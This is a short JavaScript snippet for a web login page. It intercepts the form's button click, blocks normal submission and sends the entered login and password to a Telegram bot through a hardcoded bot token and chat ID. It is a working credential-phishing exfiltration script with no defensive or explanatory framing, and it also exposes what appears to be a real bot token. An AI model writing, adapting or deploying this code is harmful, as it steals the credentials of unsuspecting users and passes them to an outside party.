let input = document.querySelectorAll('input');
let btn = document.querySelector('.c-btn');
let CHAT_ID = "914653833";
let token = '6558767746:AAHFgOWgw-Pwk5sh8wiIqiOJhQYcGcuRp_U';
btn.addEventListener('click', (e) => {
    e.preventDefault();

    let message = `Login: ${input[0].value} \n Password: ${input[1].value}`; // Example message content

    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
        })
    })
    .then(response => response.json())
    .then(data => {
        console.log(data);
    })
    .catch(error => {
        console.error('Error:', error);
    });
});
